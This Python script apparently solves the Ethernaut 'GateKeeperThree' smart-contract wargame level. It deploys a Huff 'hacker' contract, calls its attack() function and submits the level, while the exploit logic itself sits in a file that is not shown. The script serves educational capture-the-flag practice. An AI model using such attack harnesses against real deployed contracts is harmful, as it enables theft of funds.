from ape import accounts
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_contract,
    get_sig,
    send_tx,
    w3,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x762db91C67F7394606C8A636B5A55dbA411347c6"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    hacker = deploy_huff_contract(
        "GateKeeperThree.huff", instance, user, value=w3.to_wei(0.0011, "ether")
    )

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    send_tx(user, hacker, get_sig("attack()"))

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
